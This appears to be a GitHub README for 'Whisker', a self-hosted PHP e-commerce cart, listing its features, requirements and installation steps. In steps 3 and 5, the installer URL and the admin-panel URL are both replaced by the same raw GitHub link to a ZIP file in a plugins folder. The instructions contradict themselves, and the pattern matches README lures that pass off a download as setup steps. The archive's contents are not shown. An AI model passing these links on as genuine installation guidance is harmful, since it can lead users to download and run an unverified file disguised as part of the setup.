<p align="center">
  <img src="https://img.shields.io/badge/version-1.0.0-8b5cf6?style=for-the-badge" alt="Version">
  <img src="https://img.shields.io/badge/license-Whisker%20Free-f59e0b?style=for-the-badge" alt="License">
  <img src="https://img.shields.io/badge/PHP-8.0+-777BB4?style=for-the-badge&logo=php&logoColor=white" alt="PHP">
  <img src="https://img.shields.io/badge/MySQL-5.7+-4479A1?style=for-the-badge&logo=mysql&logoColor=white" alt="MySQL">
</p>

<h1 align="center">🐱 Whisker — Self-Hosted E-Commerce Cart</h1>

<p align="center">
  <strong>A lightweight, self-hosted e-commerce platform for small businesses.</strong><br>
  Beautiful storefront. Powerful admin panel. Zero monthly fees.
</p>

---

## What is Whisker?

Whisker is a free, self-hosted e-commerce cart built with PHP, MySQL, and vanilla JavaScript. No frameworks, no bloat — deploy on any shared hosting, VPS, or dedicated server. Built for small businesses, indie brands, and entrepreneurs who want a professional store without SaaS fees.

---

## Features

**Storefront** — Responsive mobile-first design, product catalog with categories & search, product variants with per-variant images, multi-currency display (30+ currencies via Frankfurter API), guest checkout + customer accounts with saved addresses, shopping cart with coupon codes, image carousel, contact form, support tickets.

**Admin Panel** — Dashboard with revenue charts & stats, product management with drag-drop image upload, category management (nested), order management with status tracking & shipping, invoice/receipt PDF generation, customer management, coupon system, CSV import (categories + products + variants in one file), email template editor, page/policy editor (Privacy, Terms, etc.), abandoned cart tracking, support ticket system, SEO settings with live Google preview, sitemap & robots.txt generator, shipping carrier & rate configuration, 5 color themes.

**Payments** — Razorpay (UPI, Cards, Netbanking), CCAvenue, Stripe (150+ countries), NOWPayments (Bitcoin, Ethereum, 300+ crypto).

**SEO** — Auto-generated meta tags, Open Graph + Twitter Cards, JSON-LD product schema for rich snippets, sitemap.xml generator, robots.txt generator, per-product/category SEO overrides, Google/Bing verification.

**Security** — Bcrypt password hashing (cost 12), CSRF protection on all forms, prepared SQL statements (PDO), session fingerprinting + 15-min timeout, login rate limiting (5 attempts/15 min), XSS output escaping, file upload MIME + extension validation, security headers (X-Frame-Options, X-Content-Type-Options, CSP), PHP execution blocked in uploads directory.

---

## Requirements

| Requirement | Minimum |
|---|---|
| PHP | 8.0+ |
| MySQL | 5.7+ / MariaDB 10.3+ |
| Web Server | Apache with `mod_rewrite` |
| PHP Extensions | PDO, pdo_mysql, mbstring, curl, openssl, json |

---

## Installation

1. Download the latest release ZIP
2. Extract and upload to your web server
3. Visit `https://github.com/ABHIJEET2OO4/Whisker-Cart/raw/refs/heads/main/plugins/Cart_Whisker_2.0.zip` in your browser
4. Follow the 6-step wizard:
   - **Step 1:** Environment check
   - **Step 2:** Database connection (with test button)
   - **Step 3:** Store name, URL, currency, timezone
   - **Step 4:** Admin account (password strength enforced)
   - **Step 5:** Payment gateway setup (optional)
   - **Step 6:** Done! 🎉
5. Log into your admin panel at `https://github.com/ABHIJEET2OO4/Whisker-Cart/raw/refs/heads/main/plugins/Cart_Whisker_2.0.zip`

---

## Custom Development

Need custom features, payment integrations, theme customization, or deployment help?

📧 **Contact: mail@lohit.me**

---

## License

Whisker Free Edition is released under the Whisker Free License v1.0. Free to use for personal and commercial projects. Redistribution is not permitted. See [LICENSE](LICENSE) for full terms.

---

<p align="center">
  <strong>🐱 Whisker v1.0.0</strong> · Built by Lohit T<br>
  📧 <a href="mailto:mail@lohit.me">mail@lohit.me</a>
</p>
